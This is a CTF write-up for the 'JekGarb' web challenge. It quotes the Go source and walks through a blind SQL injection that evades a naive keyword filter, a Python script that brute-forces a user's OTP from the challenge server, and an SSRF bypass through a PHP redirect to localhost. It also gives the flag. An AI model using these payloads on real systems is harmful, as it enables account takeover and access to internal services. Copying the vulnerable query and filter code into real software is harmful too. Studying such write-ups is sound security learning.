# We know this all too well

> And you were tossing me the car keys, f\*\*\* the patriarchy...\
> \
> JekGarb is a taxi company in an alternative universe that is 50 times the size of google, controlling the world's ride hailing services. I got hold of some their source, can you tell me what's wrong?\
> \
> http://chals.ctf.sg:40301\
> \
> author: Gladiator

### OTP Verification

After we first register an account, we will quickly find that we won't be able to log in to our registered account yet - we need to verify our OTP first.

Let's take a look at how the verification is performed.

```go
func verifyHandler(w http.ResponseWriter, r *http.Request) {
	config.SetupResponse(&w, r)
	var otp data.UserAccount
	err := json.NewDecoder(r.Body).Decode(&otp)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	if logic.VerifyOTP(otp) == false {
		http.Error(w, "Failed to verify OTP", http.StatusBadRequest)
		return
	}
	fmt.Fprint(w, "Account Verified")
}
```

```go
func VerifyOTP(account data.UserAccount) bool {
	user, _ := data.GetUser(account.Username)
	if user == nil {
		return false
	}
	if account.Otp != user.Otp || account.Username != user.Username || config.CheckPasswordHash(account.Password, user.Password) == false {
		return false
	} else {
		data.SetVerified(account.Username)
	}
	return true
}
```

Hmm... no dice. Looks like the verification logic itself is sound, so we have to find our OTP through some other vulnerability. Since the rest of the functions require us to be authenticated, we are only left with the `/search` URL.

### Bypassing SQL Injection Protection

Sure enough, the MySQL query builder function looks like it's vulnerable to SQL injection. If we are able to control the `username` being substituted, we can escape out of the string.

```go
func MySqlQueryBuilderSearchUser(username string) string {
	return fmt.Sprintf("SELECT * FROM user WHERE username = '%s'", username)
}
```

The only problem is that spaces, `AND`, and `OR` are replaced with empty strings in our query.

```go
func MySqlRealEscapeString(query string) string {
	s := strings.TrimSpace(query)
	s = strings.ToLower(s)
	s = strings.Replace(s, " ", "", -1)
	s = strings.Replace(s, "and", "", -1)
	s = strings.Replace(s, "or", "", -1)
	return s
}
```

```go
func serachHandler(w http.ResponseWriter, r *http.Request) {
	config.SetupResponse(&w, r)
	username := r.URL.Query().Get("q")
	username = config.MySqlRealEscapeString(username)
	if logic.SearchByUsername(username) == false {
		http.Error(w, "User does not exists", http.StatusBadRequest)
		return
	}
	fmt.Fprint(w, username)
}
```

To bypass this, we make use of the fact that in MySQL, comments (`/**/`) can serve as spaces, and the above replacement is non-recursive.

Our payload would then be:

```
/search?q=socengexp'/**/AANDND/**/(SUBSTR(otp,<POSITION>,1))='<GUESS>
```

Which will be translated into the MySQL query:

```sql
SELECT * FROM user WHERE username = 'socengexp' AND (SUBSTR(otp,<POSITION>,1))='<GUESS>'
```

where `GUESS` can be varied to bruteforce the character at `POSITION` (and `socengexp` is my username :smile:)

Here's the script to find our OTP, though a custom SQLMap tamper script would probably work too.

```python
import requests, string

i = 1
result = ''
while True:
    found = False
    for char in string.ascii_letters + string.digits:
        r = requests.get(f"http://chals.ctf.sg:40301/search?q=socengexp'/**/AANDND/**/(SUBSTR(otp,{i},1))='" + char)
        
        if r.status_code != 400:
            print("Found " + char)
            result += char
            i += 1
            found = True
            break
            
    if not found:
        print("Not found")
        break

print(result)
```

With the OTP we found, we can verify and log in to the application.&#x20;

### Bypassing SSRF Protection

This gives us access to `/cornelia`, which performs a GET request to a URL of our choice.

```go
func CorneliaStreet(r *http.Request) http.Response {
	cleanUrl := config.ProcessGet(r)
	if cleanUrl == "" {
		return http.Response{Status: "500 Internal Server Error", StatusCode: 500, Body: nil}
	}
	resp, err := http.Get(cleanUrl)
	if err != nil {
		return http.Response{Status: "500 Internal Server Error", StatusCode: 500, Body: nil}
	}
	return *resp
}
```

This looks like it might be vulnerable to SSRF, but the following validation prevents us from specifying `localhost` or `127.0.0.1` etc. directly.

```go
func ProcessGet(r *http.Request) string {
	var host string
	inputurl := r.URL.Query().Get("url")
	u, err := url.Parse(inputurl)
	if err != nil {
		return ""
	}
	if strings.Contains(u.Host, ":") {
		host, _, _ = net.SplitHostPort(u.Host)
	} else {
		host = u.Host
	}
	if u.Scheme == "" {
		return ""
	}
	ips, _ := net.LookupIP(host)
	for _, ip := range ips {
		if ipv4 := ip.To4(); ipv4 != nil {
			if ipv4.String() == "127.0.0.1" {
				return ""
			}
		}
	}
	return retrieveUrl(r)
}
```

That's fine, since the server follows redirects. By redirecting to `localhost:8081/flag`, we can access the flag.

```php
<?php
    Header("Location: http://localhost:8081/flag");
?>
```

The flag is `CTFSG{All_T00_W3ll_T3n_M1nutes_V3rs1on_Taylors_Version}`
